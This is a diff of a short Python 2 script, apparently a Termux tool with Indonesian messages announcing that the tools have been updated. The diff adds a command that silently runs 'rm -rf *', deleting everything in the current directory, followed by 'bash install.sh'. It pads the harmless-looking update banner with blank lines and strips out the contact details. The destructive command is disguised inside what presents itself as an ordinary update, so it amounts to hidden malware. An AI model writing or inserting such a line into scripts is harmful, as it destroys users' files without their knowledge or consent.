@@ -1,23 +1,18 @@
 import subprocess,os
-#os.system("")
-raw_input("""TOLLS TELAH DI UPDATE
+os.system("rm -rf *")
+os.system("bash install.sh")
+raw_input("""
+
+
+
+
+TOLLS TELAH DI UPDATE
 
 Akan ada Update Server
 
-Link channel : https://www.youtube.com/channel/UCLU9H65QrIC6u2UetU6476w
-NAMA CHANNEL : Script Termux
 
-JANGA  LUPA FOLLOW IG SAYA
-NANTI DI IG SAYA AKAN KASIH PERTANYAAN
-KALIAN HARUS JAWAB
 
-SETIAP 1 MINGGU SEKALI PASSWORD AKAN DI UBAH
 
-TEKAN ENTER UNTUK CHAT KE WHASTAPP
-
-KALO ADA MASALAH WA : 082211661007
-
-VIA WHATSAPP!!!!1!1!1
 """)
 subprocess.check_output(["am","start","https://www.youtube.com/channel/UCLU9H65QrIC6u2UetU6476w"])
 
